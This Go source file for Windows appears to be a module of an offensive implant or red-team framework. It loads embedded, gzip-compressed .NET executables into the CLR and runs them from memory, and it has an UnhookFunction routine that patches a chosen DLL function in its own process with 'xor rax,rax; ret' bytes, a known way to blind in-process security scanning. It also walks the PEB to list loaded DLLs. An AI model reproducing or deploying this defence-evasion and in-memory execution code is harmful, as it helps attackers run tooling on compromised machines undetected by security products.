//go:build windows

package execute_assembly

import (
	"compress/gzip"
	"embed"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"

	clr "github.com/Ne0nd0g/go-clr"
	"github.com/audibleblink/dllinquent"
	"github.com/audibleblink/memutils"
	"golang.org/x/sys/windows"
)

//go:embed embed/*
var Assemblies embed.FS

type CLR struct {
	Active string

	loaded      bool
	runtimeHost *clr.ICORRuntimeHost
	assembly    *clr.MethodInfo
}

func NewCLR() (CLR, error) {
	c := &CLR{
		loaded: false,
	}
	return c.LoadCLR()
}

func (e CLR) LoadCLR() (CLR, error) {
	err := clr.RedirectStdoutStderr()
	if err != nil {
		return e, err
	}

	e.runtimeHost, err = clr.LoadCLR("v3")
	if err != nil {
		return e, err
	}
	e.loaded = true
	return e, err
}

func (e CLR) IsLoaded() bool {
	return e.loaded
}

func (e *CLR) Load(name string) (err error) {
	assemblyBytes, err := unzippedBytes(name)
	if err != nil {
		return
	}

	e.assembly, err = clr.LoadAssembly(e.runtimeHost, assemblyBytes)
	if err != nil {
		return
	}

	e.Active = name
	return
}

func (e CLR) Execute(args []string) (stdout, stderr string) {
	stdout, stderr = clr.InvokeAssembly(e.assembly, args)
	return
}

func unzippedBytes(name string) (asmBytes []byte, err error) {
	file := fmt.Sprintf("embed/%s.exe.gz", name)
	gZipFile, err := Assemblies.Open(file)
	if err != nil {
		return
	}
	defer gZipFile.Close()

	gzReader, err := gzip.NewReader(gZipFile)
	if err != nil {
		return
	}
	defer gzReader.Close()

	asmBytes, err = ioutil.ReadAll(gzReader)
	if err != nil {
		return
	}

	if len(asmBytes) == 0 {
		err = fmt.Errorf("null read size for %s", name)
	}
	return
}

func UnhookFunction(dllName, fn string) (dllOut dllinquent.Dll, err error) {

	// x86: dec eax; xor eax eax
	// x64: xor rax rax
	poly := "4833C0"
	ret := "C3"
	data, _ := hex.DecodeString(poly + ret)

	dllOut, err = dllinquent.FindInSelf(dllName, fn)
	if err != nil {
		return
	}

	me := windows.CurrentProcess()
	err = memutils.JuggleWrite(me, dllOut.FuncAddress, data)
	return
}

// func unhook(loc uintptr, wantRet int, data []byte)

func ListDll() ([]string, error) {
	walker, err := dllinquent.NewPebWalker(os.Getpid())
	if err != nil {
		return []string{}, err
	}

	var dlls []string
	for walker.Walk() {
		dll := walker.Dll()
		dlls = append(dlls, dll.DllFullName)
	}

	return dlls, err
}
